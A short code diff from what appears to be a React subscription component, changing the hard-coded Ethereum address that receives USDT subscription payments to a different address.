@@ -71,7 +71,7 @@ const Subscription = () => {
 
   // USDT contract configuration
   const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT on Ethereum Mainnet
-  const recipientAddress = '0x742d35Cc6635C0532925a3b8D5CaAbF834B4C0c1' as `0x${string}`; // Ethereum format address
+  const recipientAddress = '0x9ec14B42b5F4526C518F0021E26C417fa76D710d' as `0x${string}`; // Updated recipient address
 
   useEffect(() => {
     const checkSubscription = async () => {
